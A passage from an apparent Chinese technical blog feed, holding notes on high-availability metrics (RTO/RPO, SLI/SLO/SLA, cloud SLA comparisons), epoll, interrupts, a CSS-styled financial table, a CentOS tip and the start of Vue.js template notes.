  &lt;li&gt;可维护性（maintainability）是指系统发生故障后，恢复的时间来描述。时间越短，可维护性越高。&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;可用性7级图表&quot;&gt;可用性7级图表&lt;/h2&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;level&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;1&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Crash with data corruption, destruction. 崩溃造成数据丢失&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;2&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Crash with new data loss. 崩溃造成新数据丢失&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Crash without data loss. 崩溃不会造成数据丢失或损坏&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;4&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;No crash, but with no or very limited service, low service quality. 通过有限制的服务防止崩溃和低质量&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;5&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Partial or limited service, with good to medium service quality. 部分或者限制级服务具有很好的媒介质量&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;6&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Failover with significant user visible delay, near full quality of service. 对显著延迟故障转移提供全质量服务&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;7&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Failover with minimal to none user visible delay, near full qualityof service. 对最小延迟故障转移提供全质量服务&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;高可用度量&quot;&gt;高可用度量&lt;/h2&gt;

&lt;h3 id=&quot;ptopro&quot;&gt;PTO/PRO&lt;/h3&gt;

&lt;p&gt;RTO和RPO是传统数据库领域常见的两个衡量高可用的指标。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;RTO(Recovery time objective):故障恢复耗时&lt;/li&gt;
  &lt;li&gt;RPO(Recovery point objective):恢复后数据对应的时间点，即丢失的数据量转换为时间&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;请求成功率&quot;&gt;请求成功率&lt;/h3&gt;

&lt;p&gt;可用性=成功请求数/总请求数&lt;/p&gt;

&lt;h3 id=&quot;sliservice-level-indicator-服务等级指标&quot;&gt;SLI(Service Level Indicator 服务等级指标)&lt;/h3&gt;
&lt;p&gt;SLI是经过仔细定义的测量指标，常见测量指标：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;性能
    &lt;ul&gt;
      &lt;li&gt;响应时间(latency)&lt;/li&gt;
      &lt;li&gt;吞吐量(throughput)&lt;/li&gt;
      &lt;li&gt;请求量(qps)&lt;/li&gt;
      &lt;li&gt;实效性(freshness)&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;可用性
    &lt;ul&gt;
      &lt;li&gt;运行时间(uptime)&lt;/li&gt;
      &lt;li&gt;故障时间/频率&lt;/li&gt;
      &lt;li&gt;可靠性&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;质量
    &lt;ul&gt;
      &lt;li&gt;准确性(accuracy)&lt;/li&gt;
      &lt;li&gt;正确性(correctness)&lt;/li&gt;
      &lt;li&gt;完整性(completeness)&lt;/li&gt;
      &lt;li&gt;覆盖率(coverage)&lt;/li&gt;
      &lt;li&gt;相关性(relevance)&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;内部指标
    &lt;ul&gt;
      &lt;li&gt;队列长度(queue length)&lt;/li&gt;
      &lt;li&gt;内存占用(RAM usage)&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;因素人
    &lt;ul&gt;
      &lt;li&gt;响应时间(time to response)&lt;/li&gt;
      &lt;li&gt;修复时间(time to fix)&lt;/li&gt;
      &lt;li&gt;修复率(fraction fixed)&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;sloservice-level-objective-服务等级目标&quot;&gt;SLO(Service level objective 服务等级目标)&lt;/h3&gt;

&lt;p&gt;指定服务所提供功能的一种期望状态，SLO是用SLI来描述的，如:每分钟平均qps &amp;gt; 100k/s、99% 访问延迟 &amp;lt; 500ms。&lt;/p&gt;

&lt;h3 id=&quot;sla&quot;&gt;SLA&lt;/h3&gt;

&lt;p&gt;服务级别协议（service-level agreement，缩写SLA）也称服务等级协议、服务水平协议，用于在商业上定义系统的高可用。SLA = SLO + 后果&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/image/sla.webp&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Percent of Uptime(平均服务时间)&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;MTBF(Mean time between Failures): 平均故障间隔&lt;/li&gt;
  &lt;li&gt;MTTR(Mean time to recover): 平均修复时间&lt;/li&gt;
  &lt;li&gt;MTTF (Mean Time To Failure): 平均故障时间&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;code&gt;Availability = MTBF / (MTBF + MTTR)&lt;/code&gt;&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: center&quot;&gt; &lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;可用性&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;数据持久度&lt;/th&gt;
      &lt;th&gt;除外条款&lt;/th&gt;
      &lt;th&gt;赔偿条款&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;阿里云ECS&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;99.95%&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;99.9999999%&lt;/td&gt;
      &lt;td&gt;（1）不可使用的服务时间低于5分钟的，不计入不可用时间；（2）阿里云预先通知用户后进行系统维护所引起的，包括割接、维修、升级和模拟故障演练；&lt;/td&gt;
      &lt;td&gt;（3）不可抗力以及意外事件引起的；	不可用时间100倍&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;阿里云rds&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;99.95%&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt; &lt;/td&gt;
      &lt;td&gt;同上，高可用版和金融版为1分钟	不可用时间100倍，高可用版和金融版，服务费的15% - 30% - 100% （99.95%-99%-95%）&lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;AWS EC2&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;99.95%&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt; &lt;/td&gt;
      &lt;td&gt;无活跃链接，运维不算，不可抗力不算&lt;/td&gt;
      &lt;td&gt;低于99.95%，赔 10%；低于99%，赔30%&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;AWS RDS&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;99.95%&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt; &lt;/td&gt;
      &lt;td&gt;类似阿里，不计时间为1分钟&lt;/td&gt;
      &lt;td&gt;低于99.95%，赔 10%；低于99%，赔25%&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;AWS S3&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;99.99%&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;99.999999999%&lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;腾讯云云主机&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;99.95%&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;99.999%&lt;/td&gt;
      &lt;td&gt;5分钟以下不计费，无其他除外条款&lt;/td&gt;
      &lt;td&gt;不可用时间100倍&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h1 id=&quot;高可用解决方案&quot;&gt;高可用解决方案&lt;/h1&gt;
&lt;p&gt;&lt;img src=&quot;/assets/image/Transaction-Across-DataCenter.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Google App Engine的co-founder Ryan Barrett在2009年的Google I/O上的演讲《Transaction Across DataCenter》（视频： http://www.youtube.com/watch?v=srOgpXECblk）&lt;/p&gt;

&lt;p&gt;主要考虑以下几个问题：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;容灾：数据不丢、结点的故障转移Failover&lt;/li&gt;
  &lt;li&gt;数据的一致性：事务处理&lt;/li&gt;
  &lt;li&gt;性能：吞吐量 、 响应时间&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;master-slave&quot;&gt;Master-Slave&lt;/h2&gt;
&lt;h2 id=&quot;master-master&quot;&gt;Master-Master&lt;/h2&gt;
&lt;h2 id=&quot;twothree-phase-commit2pc-两段提交&quot;&gt;Two/Three Phase Commit(2PC 两段提交)&lt;/h2&gt;
&lt;h2 id=&quot;paxos算法&quot;&gt;Paxos算法&lt;/h2&gt;

&lt;h1 id=&quot;影响高可用的因素&quot;&gt;影响高可用的因素&lt;/h1&gt;

&lt;p&gt;无计划的&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;系统级的故障 –  包括主机、操作系统、中间件、数据库、网络、电源以及外围设备&lt;/li&gt;
  &lt;li&gt;数据和中介的故障 – 包括人员误操作、硬盘故障、数据乱了&lt;/li&gt;
  &lt;li&gt;还有：自然灾害、人为破坏、以及供电问题。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;有计划的&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;日常任务：备份，容量规划，用户和安全管理，后台批处理应用&lt;/li&gt;
  &lt;li&gt;运维相关：数据库维护、应用维护、中间件维护、操作系统维护、网络维护&lt;/li&gt;
  &lt;li&gt;升级相关：数据库、应用、中间件、操作系统、网络、包括硬件升级&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;真正决定高可用系统的本质原因&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;一套科学的牛逼的软件工程的管理&lt;/li&gt;
  &lt;li&gt;先进的自动化的运维工具&lt;/li&gt;
  &lt;li&gt;技术能力很牛逼的工程师团队&lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://coolshell.cn/articles/17459.html&quot;&gt;酷壳-关于高可用的系统&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://coolshell.cn/articles/10910.html&quot;&gt;酷壳-分布式系统的事务处理&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.jianshu.com/p/7ca6bc59d6b3&quot;&gt;数据库高可用的定义和度量&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://blog.coding.net/blog/architecture-concept-and-practice-from-Google&quot;&gt;来自 Google 的高可用架构理念与实践&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.yunweipai.com/archives/10703.html&quot;&gt;深度剖析什么是 SLI、SLO和SLA&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
 </entry>
 
 <entry>
   <title>网络I/O模型</title>
   <link href="http://yanpeipan.github.io/2018/09/13/io.html"/>
   <updated>2018-09-13T00:00:00+08:00</updated>
   <id>http://yanpeipan.github.io/2018/09/13/io</id>
   <content type="html">
&lt;ol&gt;
  &lt;li&gt;系统内核创建一颗红黑树用于保存需要监听的文件描述符&lt;/li&gt;
  &lt;li&gt;使用mmap开辟一块在内核态和用户态中间的内存用于传递文件描述符，&lt;/li&gt;
  &lt;li&gt;每个文件描述符在插入树的时候就已经注册一个回掉函数，当设备检测到该文件描述符上有事件发生的时候，通过该回掉函数返回，并将该描述符插入到系统准备好的就绪链表当中，而epoll_wait只需要检测链表中是否有数据即可。&lt;/li&gt;
&lt;/ol&gt;
</content>
 </entry>
 
 <entry>
   <title>中断</title>
   <link href="http://yanpeipan.github.io/2018/09/12/%E4%B8%AD%E6%96%AD.html"/>
   <updated>2018-09-12T00:00:00+08:00</updated>
   <id>http://yanpeipan.github.io/2018/09/12/中断</id>
   <content type="html">
&lt;blockquote&gt;
  &lt;p&gt;在计算机科学中，中断（英语：Interrupt）是指处理器接收到来自硬件或软件的信号，提示发生了某个事件，应该被注意，这种情况就称为中断。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;通常，在接收到来自外围硬件（相对于中央处理器和内存）的异步信号，或来自软件的同步信号之后，处理器将会进行相应的硬件／软件处理。发出这样的信号称为进行中断请求（interrupt request，IRQ）。硬件中断导致处理器通过一个运行信息切换（context switch）来保存执行状态（以程序计数器和程序状态字等寄存器信息为主）；软件中断则通常作为CPU指令集中的一个指令，以可编程的方式直接指示这种运行信息切换，并将处理导向一段中断处理代码。中断在计算机多任务处理，尤其是即时系统中尤为有用。这样的系统，包括运行于其上的操作系统，也被称为“中断驱动的”（interrupt-driven）。&lt;/p&gt;

&lt;h2 id=&quot;分类&quot;&gt;分类&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;硬件中断（Hardware Interrupt）&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;可屏蔽中断（maskable interrupt）。硬件中断的一类，可通过在中断屏蔽寄存器中设定位掩码来关闭。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;非可屏蔽中断（non-maskable interrupt，NMI）。硬件中断的一类，无法通过在中断屏蔽寄存器中设定位掩码来关闭。典型例子是时钟中断（一个硬件时钟以恒定频率—如50Hz—发出的中断）。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;处理器间中断（interprocessor interrupt）。一种特殊的硬件中断。由处理器发出，被其它处理器接收。仅见于多处理器系统，以便于处理器间通信或同步。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;伪中断（spurious interrupt）。一类不希望被产生的硬件中断。发生的原因有很多种，如中断线路上电气信号异常，或是中断请求设备本身有问题。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;软件中断（Software Interrupt）&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;软件中断。是一条CPU指令，用以自陷一个中断。由于软中断指令通常要运行一个切换CPU至内核态（Kernel Mode/Ring 0）的子例程，它常被用作实现系统调用（System call）。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;触发&quot;&gt;触发&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;状态触发&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;在依状态触发的中断系统中，一个等待响应的中断会在中断请求线路上以特定的电位标示，如高电位（1）或低电位（0）。当一个设备希望发送中断信号时，它驱动中断请求线路至相应的电位，并在CPU发出强制停止命令或处理所请求的中断事件之前始终保持。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;边沿触发&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;在依边沿触发的中断系统中，中断设备通过向中断线路发送一个脉冲来表示其中断请求。脉冲可以为上升沿或下降沿。在发送完脉冲后设备立即释放中断线路。如果这个脉冲太短，以至于I/O轮询不足以确保知悉其存在，则有必要使用专门的硬件设备来辅助对边沿触发的探查。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;混合模式&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;一些系统使用状态触发与边沿触发兼顾的混合中断模式。其硬件不但探测脉冲，也验证中断信号是否保持一段时间。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;非可屏蔽中断多使用混合模式。由于非可屏蔽中断多与重要的系统异常事件相关，十分有必要确保对其中断信号的捕捉快速而正确。这种两步骤探查方式能够有效减轻错误中断或遗失中断给系统带来的影响。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;消息信号（Message-signalled）&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;消息信号式中断并不直接通过对特定物理线路进行断言／发送脉冲来通知一个中断。这类中断设备通过在某种通讯介质（一般是计算机总线）上发送一个有逻辑含义的消息（一串／排比特码）来实现中断请求。中断消息可以是通讯总线协议中专门为中断预留的类型，也可以是一个现有的类型，如内存写操作。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;消息信号式中断在行为上与边沿触发中断类似，因为它们都是发送一个瞬间的信号。中断处理软件的对此类中断的处理方式也类似于边沿触发中断：如果两个消息相同，则可以合并。消息信号中断向量（中断处理程序的地址）也可以共享，就如同物理线路可以被共享一般。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;由于中断消息的识别基于特定的比特码序列而不是物理线路上的单个信号，可以有效地通过设定不同的中断比特码来划分和处理不同类型的中断。另外，使用串行或并行总线都可以传递中断消息。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h1 id=&quot;参考&quot;&gt;参考&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://zh.wikipedia.org/wiki/%E4%B8%AD%E6%96%B7&quot;&gt;wikipedia 中断&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
 </entry>
 
 <entry>
   <title>HTML表格</title>
   <link href="http://yanpeipan.github.io/2018/09/12/HTML%E8%A1%A8%E6%A0%BC.html"/>
   <updated>2018-09-12T00:00:00+08:00</updated>
   <id>http://yanpeipan.github.io/2018/09/12/HTML表格</id>
   <content type="html">
&lt;style&gt;
  .table&gt;thead {
    display: block;
    float: left;
  }
  .table&gt;tbody {
    display: block;
    position: relative;
    width: auto;
    overflow-x: auto;
    white-space: nowrap;
  }
  .table&gt;thead&gt;tr {
    display: block;
  }
  .table&gt;thead&gt;tr&gt;th {
    display: block;
    text-align: right!important;
    overflow: hidden;
  }
  .table&gt;tbody&gt;tr {
    display: inline-block;
    vertical-align: top;
  }
  .table&gt;tbody&gt;tr&gt;td {
    display: block;
    text-align: center;
    width: 111px;
  }
&lt;/style&gt;

&lt;table class=&quot;table&quot;&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;报表日期&lt;/th&gt;
      &lt;th&gt;报表类型&lt;/th&gt;
      &lt;th&gt;流动比率&lt;/th&gt;
      &lt;th&gt;速动比率&lt;/th&gt;
      &lt;th&gt;资产负债率&lt;/th&gt;
      &lt;th&gt;产权比率&lt;/th&gt;
      &lt;th&gt;利息保障倍数&lt;/th&gt;
      &lt;th&gt;有形净值债务率&lt;/th&gt;
      &lt;th&gt;营运资金&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr data-exchange=&quot;0.1590&quot; data-currency=&quot;CNY&quot;&gt;
      &lt;td&gt;2018-06-30&lt;/td&gt;
      &lt;td&gt;月报&lt;/td&gt;
      &lt;td&gt;43.43&lt;/td&gt;
      &lt;td&gt;43.43&lt;/td&gt;
      &lt;td&gt;0.01&lt;/td&gt;
      &lt;td&gt;1.44&lt;/td&gt;
      &lt;td&gt;/&lt;/td&gt;
      &lt;td&gt;2.88&lt;/td&gt;
      &lt;td&gt;4,285.00&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr data-exchange=&quot;0.1590&quot; data-currency=&quot;CNY&quot;&gt;
      &lt;td&gt;2018-07-31&lt;/td&gt;
      &lt;td&gt;月报&lt;/td&gt;
      &lt;td&gt;222.55&lt;/td&gt;
      &lt;td&gt;222.55&lt;/td&gt;
      &lt;td&gt;0.00&lt;/td&gt;
      &lt;td&gt;16.17&lt;/td&gt;
      &lt;td&gt;113,431.00&lt;/td&gt;
      &lt;td&gt;16.17&lt;/td&gt;
      &lt;td&gt;21,269.00&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr data-exchange=&quot;0.1511&quot; data-currency=&quot;CNY&quot;&gt;
      &lt;td&gt;2018-08-31&lt;/td&gt;
      &lt;td&gt;月报&lt;/td&gt;
      &lt;td&gt;0.31&lt;/td&gt;
      &lt;td&gt;0.31&lt;/td&gt;
      &lt;td&gt;0.15&lt;/td&gt;
      &lt;td&gt;5.21&lt;/td&gt;
      &lt;td&gt;-19.35&lt;/td&gt;
      &lt;td&gt;5.44&lt;/td&gt;
      &lt;td&gt;-25,179.00&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr data-exchange=&quot;0.1467&quot; data-currency=&quot;CNY&quot;&gt;
      &lt;td&gt;2018-09-30&lt;/td&gt;
      &lt;td&gt;月报&lt;/td&gt;
      &lt;td&gt;1.06&lt;/td&gt;
      &lt;td&gt;1.05&lt;/td&gt;
      &lt;td&gt;0.69&lt;/td&gt;
      &lt;td&gt;1.92&lt;/td&gt;
      &lt;td&gt;-1.46&lt;/td&gt;
      &lt;td&gt;2.00&lt;/td&gt;
      &lt;td&gt;41,251.00&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
</content>
 </entry>
 
 <entry>
   <title>CentOS</title>
   <link href="http://yanpeipan.github.io/2017/01/11/centos.html"/>
   <updated>2017-01-11T00:00:00+08:00</updated>
   <id>http://yanpeipan.github.io/2017/01/11/centos</id>
   <content type="html">
&lt;p&gt;&lt;code&gt;Error: Protected multilib versions&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;yum downgrade&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Vue.js</title>
   <link href="http://yanpeipan.github.io/2017/01/09/vue.html"/>
   <updated>2017-01-09T00:00:00+08:00</updated>
   <id>http://yanpeipan.github.io/2017/01/09/vue</id>
   <content type="html">
&lt;hr /&gt;

&lt;nav&gt;
&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#基础&quot; id=&quot;markdown-toc-基础&quot;&gt;基础&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#1-模板语法&quot; id=&quot;markdown-toc-1-模板语法&quot;&gt;1. 模板语法&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#插值&quot; id=&quot;markdown-toc-插值&quot;&gt;插值&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#指令&quot; id=&quot;markdown-toc-指令&quot;&gt;指令&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#filter&quot; id=&quot;markdown-toc-filter&quot;&gt;Filter&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#缩写&quot; id=&quot;markdown-toc-缩写&quot;&gt;缩写&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#经验&quot; id=&quot;markdown-toc-经验&quot;&gt;经验&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#1-css-的组件作用域&quot; id=&quot;markdown-toc-1-css-的组件作用域&quot;&gt;1. CSS 的组件作用域&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#2-页面闪烁&quot; id=&quot;markdown-toc-2-页面闪烁&quot;&gt;2. 页面闪烁&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#3-抽象组件keep-alive&quot; id=&quot;markdown-toc-3-抽象组件keep-alive&quot;&gt;3. 抽象组件&lt;code&gt;&amp;lt;keep-alive&amp;gt;&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#库&quot; id=&quot;markdown-toc-库&quot;&gt;库&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#参考&quot; id=&quot;markdown-toc-参考&quot;&gt;参考&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;/nav&gt;

&lt;h1 id=&quot;基础&quot;&gt;基础&lt;/h1&gt;

&lt;blockquote&gt;

  &lt;p&gt;Vue.js 是一套构建用户界面的渐进式框架。
Vue.js 的目标是通过尽可能简单的 API 实现响应的数据绑定和组合的视图组件。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;1-模板语法&quot;&gt;1. 模板语法&lt;/h2&gt;

&lt;h3 id=&quot;插值&quot;&gt;插值&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;文本(Mustache语法)&lt;/p&gt;

  &lt;p&gt;&lt;code&gt;&amp;lt;span&amp;gt;Message: { { msg } }&amp;lt;/span&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;HTML
&lt;code&gt;&amp;lt;div v-html=&quot;rawHtml&quot;&amp;gt;&amp;lt;/div&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;属性
Mustache 不能在 HTML 属性中使用，应使用 v-bind 指令：&lt;/p&gt;

  &lt;p&gt;&lt;code&gt;&amp;lt;div v-bind:id=&quot;dynamicId&quot;&amp;gt;&amp;lt;/div&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;JavaScript表达式&lt;/p&gt;

  &lt;p&gt;&lt;code&gt;&amp;lt;div v-bind:id=&quot;'list-' + id&quot;&amp;gt;&amp;lt;/div&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;指令&quot;&gt;指令&lt;/h3&gt;
&lt;blockquote&gt;
  &lt;p&gt;指令（Directives）是带有 v- 前缀的特殊属性&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;filter&quot;&gt;Filter&lt;/h3&gt;
&lt;blockquote&gt;
  &lt;p&gt;过滤器只能在 mustache 绑定和 v-bind 表达式（从 2.1.0 开始支持）中使用&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;缩写&quot;&gt;缩写&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;code&gt;v-bind&lt;/code&gt;&lt;/p&gt;

  &lt;div class=&quot;language-html highlighter-coderay&quot;&gt;&lt;div class=&quot;CodeRay&quot;&gt;
  &lt;div class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span style=&quot;color:#070;font-weight:bold&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span style=&quot;color:#b48&quot;&gt;v-bind:href&lt;/span&gt;=&lt;span style=&quot;background-color:hsla(0,100%,50%,0.05)&quot;&gt;&lt;span style=&quot;color:#710&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&quot;color:#D20&quot;&gt;url&lt;/span&gt;&lt;span style=&quot;color:#710&quot;&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;span style=&quot;color:#070;font-weight:bold&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&quot;color:#070;font-weight:bold&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
&lt;span style=&quot;color:#070;font-weight:bold&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span style=&quot;color:#b48&quot;&gt;:href&lt;/span&gt;=&lt;span style=&quot;background-color:hsla(0,100%,50%,0.05)&quot;&gt;&lt;span style=&quot;color:#710&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&quot;color:#D20&quot;&gt;url&lt;/span&gt;&lt;span style=&quot;color:#710&quot;&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;span style=&quot;color:#070;font-weight:bold&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&quot;color:#070;font-weight:bold&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
  &lt;/div&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;code&gt;v-on&lt;/code&gt;&lt;/p&gt;

